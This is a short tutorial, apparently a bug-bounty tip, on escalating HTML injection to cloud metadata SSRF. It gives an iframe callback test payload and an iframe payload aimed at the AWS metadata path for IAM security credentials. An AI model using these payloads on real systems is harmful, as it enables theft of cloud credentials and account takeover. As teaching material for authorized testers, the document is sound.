### SecurityExplained S-4: Escalating HTML Injection to Cloud Metadata SSRF

```
If you have found an HTML Injection vulnerability that allows you to load <iframe>, <img> or similar tag and the application is utilizing "Cloud Services" such as "AWS", it is possible to escalate the finding to perform "Cloud Metadata SSRF".

Performing this attack is quite simple:

1. Confirm if the application is try to load an iframe by using already found HTML Injection. Example Payload: <iframe src="collaborator_url/" title="SSRF Test"></iframe>
2. If the iframe is loaded successfully and the interaction is received on the Collaborator, next step is to check for Metadata SSRF.
3. Now, perform the attack with the following payload (Specific to AWS):<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" title="SSRF Test"></iframe>
4. If the loaded iframe contains "security credentials", you can perform further enumeration.
5. Also, if the application is rendering the HTML code in the "PDF", this attack is still possible, so worth trying.

Here is the list of Metadata endpoints for different cloud service providers: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#ssrf-url-for-cloud-instances

```

[Follow Twitter Thread](https://twitter.com/harshbothra_/status/1478394407095353346?s=20&t=QR8LCZPmGCrSu2SuCUBCgQ)
